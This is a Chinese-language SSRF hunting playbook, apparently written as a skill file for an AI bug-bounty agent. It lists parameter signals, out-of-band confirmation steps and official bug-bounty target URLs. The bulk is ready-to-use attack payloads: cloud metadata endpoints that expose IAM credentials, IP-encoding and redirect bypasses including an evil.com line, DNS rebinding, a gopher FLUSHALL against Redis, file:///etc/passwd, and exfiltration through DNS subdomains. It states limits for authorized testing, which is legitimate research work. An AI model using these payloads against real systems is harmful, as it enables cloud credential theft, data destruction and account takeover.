---
name: hunt-ssrf
description: >
  SSRF 服务端请求伪造狩猎手册（低成本高价值漏洞，linkage 阶段优先测）。
  来源：hunt-ssrf 技能（15 份公开赏金报告提炼：AWS/GCP/Azure 元数据 SSRF、DNS rebinding、
  短链绕过、gopher→Redis RCE、headless 浏览器 PDF 渲染链）+ 台账 3 个实战案例
  （图片审核盲打、小程序头像 store-and-read 云接管、低代码调试全回显）+ 云元数据端点表。
  触发条件：任何"服务端拉取 URL"的参数/功能。OOB 确认是盲打唯一判定标准。
metadata:
  tags: "ssrf,imds,cloud-metadata,oob,dnslog,redirect-bypass,webhook,url-fetch"
  category: "offensive-security"
---

# SSRF 狩猎手册（hunt_ssrf）

> **为什么优先测**：探测成本 = 把参数值换成目标地址发几个请求（秒级、低噪音、不触发 WAF），
> 价值 = 云凭证泄露（云接管/数据泄露，SRC 高危起步）。**性价比全漏洞类型第一梯队。
> 本 skill 定位在 linkage 阶段（🟡 普通测试）就开打，不等 highrisk 门——那是"已有洞后的升级"，不是"找洞"。**
> 相关：`knowledge/references/decision-trees/06-ssrf.md`（合规边界/决策流程）、
> `knowledge/references/cloud-attack-surface.md` §8（云元数据+Store-and-Read）、
> `knowledge/experience/ssrf.md`（3 个实战案例精读）。

---

## 0. 识别信号（命中即读本文件，linkage 阶段逐条核对）

### 参数名（GET/POST/JSON body 里出现即测）
```
url uri endpoint redirect src source feed host target dest file path callback image load fetch
link preview_url avatar_url userAvatar webhook_url image_url cover_url return_url next_url
```

### 功能形态（比参数名更可靠的信号——按功能找参数）
| 功能 | 特征 | 备注 |
|---|---|---|
| 上传/审核/转存/水印/压缩/预览 | 提交 URL 由服务端拉取 | **业务错误消息即 fetch 证明**（"图片违规"= 真拉取了） |
| 头像/封面/富文本图片 | userAvatar/avatarUrl/coverUrl 字段 | store-and-read 可把盲打变回显 |
| 低代码/开放平台 API 调试 | "测试/调试 API" 弹窗 | **全回显 SSRF 原语**，最强形态 |
| 链接预览/unfurl/分享卡片 | 提交链接生成预览 | Reddit/Slack 模式 |
| Webhook 注册/回调配置 | 填 URL 触发回调 | 回调目标可换内网 |
| PDF/截图生成（headless） | 渲染用户模板/URL | 可注入 `<iframe src=内网>` 读响应 |
| 文件导入（XML/CSV/远程 schema） | 拉远程资源 | 可能 XXE+SSRF 双料 |
| 二维码/短链生成 | redirectUrl/url 参数 | 内容回显载体 |

### JS 特征（recon 阶段留意）
`fetch(userInput)` / `axios.get(params.url)` / `url: req.body.url` / `src: params.source` / `href: query.endpoint`

---

## 1. OOB-Or-It-Didn't-Happen 判定门（盲打铁律，先读）

**盲打 SSRF 的确认必须有 OOB 回调：dnslog.cn（最快，methodology §4 首选）或 interactsh-client。**
探测时把回调地址**按 sink 加子标签**（`img.<dnslog>`, `import.<dnslog>`…），回调能定位是哪个功能打的。

### 什么【不算】确认（三件最容易误报的事）
- ❌ 服务端把你的 URL 回显在错误消息里（"The Web application at http://evil/x could not be found"
  只是字符串格式化，不代表发过请求）
- ❌ 外部 URL 与 localhost 返回不同状态码（可能是 scheme 校验器的差异，不是真拉取）
- ❌ 响应延迟变大（可能只是 DNS 解析耗时，不是完成了 HTTP fetch）

### 什么【算】确认
- ✅ dnslog/OOB 面板收到你的唯一子域名解析记录
- ✅ OOB HTTP 端点收到带服务端来源 IP/UA 的请求
- ✅ headless 场景：渲染进程对你的回调 URL 发起 fetch

### 默认流程
1. 先种 OOB 子域（按 sink 分标签）→ 2. 把回调 URL 填入参数发请求 → 3. 等 30-120s 轮询面板
→ 4. 只有回调实锤才算 SSRF。零回调 = 撤回结论，即使错误消息回显了 URL。

> 台账教训：SharePoint `download.aspx?SourceUrl=` 返回 500 且错误页回显攻击者 URL，
> 12+ 个 URL 参数 × 38 个打点零回调——"回显"是客户端错误串格式化，不是 SSRF。
> 直接报会被 triage 打 N/A。

---

## 2. OOB 回调源选择（三大来源，按目标所属 SRC 优先用官方靶标）

### 2a. 各大 SRC 官方内网靶标（**首选**——小红书靶标见平台规则 xhs.md 同源）——靶标本身即授权证明，报告直接采信）

> 靶标分两类：**有回显**（响应/页面直接出现 flag=SSRF 实锤）与**无回显**（靶标记录访问日志，
> 报告中写明测试时间+自定义字段由 SRC 后台核验）。目标属于哪家 SRC 就用哪家的靶标，
> 既绕过"探测内网"合规争议，又是平台认可的判定标准。

| SRC | 有回显靶标 | 无回显靶标（host= 换成你的 dnslog） | 备注 |
|---|---|---|---|
| 京东 | `http://ssrf.jd.local/c3f3f53c12674acdc9855f47b8529` | — | 页面出现内容即实锤 |
| 百度 | `http://bsrc-ssrf.n.baidu-int.com/bsrc_uid` / `http://10.169.4.131/bsrc_uid` | — | uid 取自 `https://bsrc.baidu.com/v2/api/info` 的 userId 字段 |
| 360 | `http://10.229.2.9:5001` | `http://10.229.2.9:5001/index?host=your_dnslog` | |
| 腾讯 | `http://tst.qq.com/flag.html` | `http://tst.qq.com/ssrf_forward.php?host=your_dnslog` | |
| 字节 | `https://src-ssrf.bytedance.net/ssrf` | `https://src-ssrf.bytedance.net/ssrf?host=your_dnslog` | |
| 美团 | `https://mtsrc-test.sankuai.com/ssrf` | 同左（留存访问记录，报告中写明测试时间由 SRC 核验） | 无独立 host 参数 |
| 讯飞 | `http://ssrf.security.private/` 或 `http://diting.xfyun.cn` | — | |
| 小米 | `https://ssrf.dun.mi.com/ssrf/hacker` | 同左（`hacker` 字段自定义用于区分；无回显时报告写自定义字段+访问时间） | |
| 看云 | `http://10.13.50.28:5555/flag.html` | `http://10.13.50.28:5555/ssrf_forward?host=yourdnslog.domain` | host 直接填域名不带协议 |
| 小红书 | `http://10.11.23.35:5555/flag.html` | `http://10.11.23.35:5555/ssrf_forward?host=yourdnslog.domain`（host 直接填域名不带协议） | 官方规则明文:完整回显=高危/无完整回显=中危/无回显bind=低危 |

**用法纪律**：目标属于表内 SRC → 靶标 URL 直接当参数值打，有回显截图、无回显记录时间；
目标不在表内 → 用 §2b/§2c 通用通道。靶标只用于"证明 SSRF 存在"，不用于升级利用。

### 2b. 自有 VPS OOB 通道（通用首选——但有硬性前提，见红线）

> ⚠️ **红线：OOB 接收机绝不能与扫描机是同一台机器。**
> 当前 xs-bigdan 若部署在云服务器上，**禁止**把该服务器自身 IP 当回调地址——
> 目标回调 = 目标反向触碰你的扫描基础设施（SSRF 升级链 302/gopher 会反向打自己），
> 且 http.server 残留进程/端口会污染后续任务的资产判定。**先在另一台 VPS 上部署监听器再用本节。**

前提满足（有独立的监听 VPS）时的用法——完全可控、可抓完整请求、可部署 302 跳转：

```bash
# 监听 VPS 上(不是扫描机!):
python -m http.server 80                      # HTTP 回显: curl http://vps-ip/probe-<sink>
# DNS: 域名 NS 指到监听 VPS,抓 dns 查询日志

# 按 sink 打标签(与公共 dnslog 同纪律):
http://<vps-ip>/probe-img    http://<vps-ip>/probe-import    # 哪个路径被请求=哪个 sink 出网

# 监听 VPS 独有优势——302 跳转链(§4 绕过)与 HEAD/GET 分流:
#   HEAD 返回 200 过预检,GET 302 跳内网/元数据(把 <TGT> 换成 169.254.169.254 或内网地址)
```

监听 VPS 的 HTTP 日志能看到**服务端来源 IP 与 UA**——顺带完成内网出口测绘（台账案例 1：多网段回连=分布式审计集群）。
**判定自检**：写 FINDING 前确认回调地址的 IP ≠ 本机出口 IP（`curl -s ifconfig.me` 对照），一致即换通道。

### 2c. 公共 dnslog（无 VPS 时的兜底）

`dnslog.cn`（最快）/ `ceye.io` / `interactsh-client`。纪律不变：按 sink 打子标签，
等 30-120s 轮询，零回调即撤回结论。公共面板有他人可见风险，凭证级内容不要编码进公共子域。

---

## 3. 云元数据 Payload 表（确认 SSRF 后第一优先打这个，凭证=高危及上）

| # | Payload | 目标 | 要点 |
|---|---|---|---|
| 1 | `http://169.254.169.254/latest/meta-data/` | AWS IMDSv1 | 无认证直接读 |
| 2 | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | AWS IAM 角色名 | 有角色名再拼 `<角色名>` 读 AK/SK |
| 3 | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` + 头 `Metadata: true` | Azure IMDS | **必须带头**，无头返回 400 |
| 4 | `http://metadata.google.internal/computeMetadata/v1/` + 头 `Metadata-Flavor: Google` | GCP | 带头；SA token 在 `/instance/service-accounts/default/token` |
| 5 | `http://100.100.100.200/latest/meta-data/` | 阿里云 | 根目录即 meta-data |
| 6 | `http://metadata.tencentyun.com/meta-data/` | 腾讯云 | 非 169.254；CAM 凭证 `/meta-data/cam/role-security-credentials/<角色名>`（台账实证） |
| 7 | `http://[::ffff:a9fe:a9fe]/latest/meta-data/` | AWS IPv6 映射绕过 | a9fe:a9fe = 169.254.169.254 的 IPv6 映射形态，过纯 IPv4 黑名单 |

**读取顺序**：先根目录（证明可达）→ 角色名列表 → 具体凭证端点。**合规红线：拿到 TmpSecretId/TmpToken/AK/SK 即停并报告（TIER 3），不实际调用云 API、不读 COS/OSS 数据。**

### IMDSv2（AWS 强制 token 时）
```bash
# 仅当 SSRF 支持 PUT + 自定义头（部分库/调试代理支持 method 覆盖）
TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
# 后续 GET 带: X-aws-ec2-metadata-token: $TOKEN
```
只支持 GET 的 SSRF 遇上 IMDSv2：元数据返回 401 是"被 token 挡"而非"不可达"，别误判为不存在。

---

## 4. 绕过变体表（黑名单拦截 169.254/127.x/内网段时逐条试）

### URL 解析差异（过 IP 黑名单的经典系）
```
http://169.254.169.254@evil.com/           # @ 前内容被部分解析器忽略
http://2852039166/latest/meta-data/        # 十进制 IP (=169.254.169.254)
http://0xA9FEA9FE/latest/meta-data/        # 十六进制 IP
http://0251.0376.0251.0376/                # 八进制点分 (=169.254.169.254)
http://025177524776/                       # 八进制单整数（部分解析器）
http://[::ffff:169.254.169.254]/           # IPv6 映射
http://[::ffff:a9fe:a9fe]/                 # IPv6 映射（hex 形态）
http://169.254.169.254.nip.io/             # DNS 通配（解析到该 IP）
http://0x7f000001/ / http://2130706433/    # 127.0.0.1 的 hex/十进制
http://127.1/ / http://0/                  # 短写（部分系统 0=本机）
http://localhost/ / http://Localhost/      # 大小写混用过区分大小写黑名单
```

### 重定向/短链绕过（过域名黑名单）
- **302 链**：自己 VPS 上部署 302 → 内网/元数据。HEAD 返回 200、GET 跳 302 可过"预检型"校验
- **第三方短链**：把元数据 URL 转短链（dzxf119.cn 类）→ 短链域名不在黑名单 → 服务端 302 跟随到元数据（台账案例 3 实证）
- **DNS rebinding**：TTL=0 域名，校验时解析外网 IP、请求时解析到 169.254.169.254（`lock.cmpxchg8b.com/rebinder.html` 生成）

### 协议混淆（仅在明确授权/靶场场景，SRC 默认不做）
```
file:///etc/passwd                    # 读本地文件（SRC 允许,自己账号）
dict://127.0.0.1:6379/INFO            # 端口探测
gopher://127.0.0.1:6379/_FLUSHALL     # Redis 交互（SRC 禁止,除非授权渗透）
ldap:// / sftp://                     # 其他协议
```


## 4b. 云开发/网关代打三招（clown 短表精读，过滤分裂场景的进阶打法）

> 适用：目标部署在腾讯云/阿里云上、且存在云开发/HTTP 网关/代理类功能。
> 核心洞察：**回环拦截与元数据拦截常是两套规则**——回环 403 ≠ 元数据也拦。

### A. 云厂商元数据路径差（腾讯云双路径，台账案例 2 的深水区）

CAM 临时凭证有两套路径，第一套常 404，**必须再打第二套**：
```
/meta-data/cam/security-credentials/<角色名>              # 第一套: 常 404
/meta-data/cam/service-role-security-credentials/<角色名>  # 第二套: 真正的钥匙路径
```
判成：拿到 TmpSecretId / TmpSecretKey / Token 三元组 = 凭证级（TIER 3 即停）。
只读到 instance-id / 钥匙 404 = 还没成，写 PENDING。

### B. 过滤对照法（判断拦的是"哪一层"）

先打 `http://127.0.0.1/`（回环），再打元数据域名。回环 403 / "Forbidden Loopback"
**≠ 元数据也被拦**——很多实现只拦回环字符串、不按解析后 IP 拦元数据域名。分裂即继续打。

### C. 匿名网关当入口（云开发 *proxy* 类功能）

官方演示环境/匿名登录（signin/anonymously 类）拿到的 token **不当"已登录权限内"处理**，
带着它去打 path 含 `proxy` 的接口（参数 targetUrl/url/callback）。一处环境禁掉 ≠ 全产品禁掉，
换环境继续试。**固定 POST 的开放代理**：直打元数据 405（IMDS 只吃 GET）≠ 没洞——
先打公网 302（redirect-to 类参数）让代理跟跳转时改写成 GET（阿里云角色在 ram/security-credentials/）。

### D. 公开 GOPROXY（区分于 A 的云开发代理）

公开 GOPROXY（/go/ 路径、模块 /@v/list 会做 ?go-get=1 再跟 VCS）：模块路径写自己的域，
页面 go-import 配 **hg** 协议 + `http://<厂商元数据域名>/...`（git HTTPS 常超时），
hg 跟取即出元数据/钥匙。RFC1918 Forbidden ≠ 元数据域名也拦。

### E. COS 回源竞态（见了回源配置再打，条件苛刻）

业务从 COS/OSS 取对象且桶配了"对象不存在则回源"到可控源、且能对同一 key PUT+DELETE：
一边 PUT（检测时对象在，不回源）一边 DELETE（真正 GET 时回源跟 302）——并发手法见
`race_condition/SKILL.md`。只证明能配回源没打到内网 = 没成，不进报告。

---
---

## 5. 攻击面扫描流程（linkage 阶段执行顺序）

```
Step 1  枚举 URL 类参数：browser_probe open/xhr 抓 XHR 参数、ffuf -w paramDict 扫 ?url=
        （含 JS 里挖出的业务参数名,最高信噪比）
        ↳ 同批参数顺带测开放重定向: `tools/bin/xsredir.py`（payload 含 evil.com 变体系,Location 判定）
Step 2  每类参数先打 OOB（dnslog 子标签区分 sink）→ 有回调=SSRF 确认,进 Step 3
Step 3  云元数据表逐条打（§3）→ 有内容=凭证级
Step 4  内网探测分层（每层只证明可达,不深挖）:
        http://127.0.0.1:80 → :8080 → :6443(K8s API) → :10250(kubelet) → :2379(etcd)
        → :9090(Prometheus) → :9200(ES) → :6379(Redis) → :8500(Consul)
Step 5  有白名单/黑名单 → §4 绕过表逐条试（每条都配 OOB 验证）
Step 6  盲打场景 → §6 盲打技巧三连
```

**时序 oracle（盲打枚举 IAM 角色/内网端口）**：响应大小与耗时正相关——同一个 pingback 类
盲打接口（如 WordPress xmlrpc pingback.ping），换 URL 测耗时：角色存在=JSON 响应更慢、
404=更快。每个值测 3 次取中位数，基线方差 >20% 时结果不可信。

---

## 6. 盲打技巧三连（响应不回显时的确认/升级手段）

1. **业务错误消息即 fetch 证明**：上传/审核/转存类接口返回"图片违规/下载失败/格式错误"
   = 服务端真的拉取了你的 URL。这是**业务层 oracle**，比 OOB 还直接，且能定位到具体功能。
2. **Store-and-Read（盲打变回显）**：用户提交 URL → 服务端拉取 → 结果存储 → 存储路径公开可访问
   （头像/水印/压缩/导入类功能）。提交元数据地址后 GET 回显的 CDN 路径即可读到 SSRF 响应
   （台账案例 2：userAvatar → 腾讯云元数据 → CAM STS 全回显）。
3. **DNS 外带数据**：headless/JS 执行场景，`btoa(响应).子域.回调域` 编码外带；或 pingback 类
   接口把元数据内容拼进第二个参数（URL 编码）触发二次请求外带。

---

## 7. 验证与收尾（FOUND→CONFIRMED 的标准）

- 证据链：请求原文（xsreq 落盘）+ OOB 回调截图/日志行 + 响应内容（元数据/内网响应）。
- 三级分类：回调+内容=CONFIRMED；仅回调无内容=CONFIRMED(盲打,写明可达范围)；
  仅错误回显/延迟差异=**PENDING 或直接弃**（判定门 §1）。
- 影响描述写"能做什么"：如"可读取云元数据 → 泄露 IAM 临时凭证 → 云账号接管"而非"存在 SSRF"。
- 影响升级看链：SSRF → 元数据 → 云接管；SSRF → 内网未授权接口 → 数据泄露；SSRF → Redis(gopher) → RCE（仅授权渗透）。
- 合规：只证明可达即停；内网探测不做端口全扫；凭证级证据到手即停手写报告。
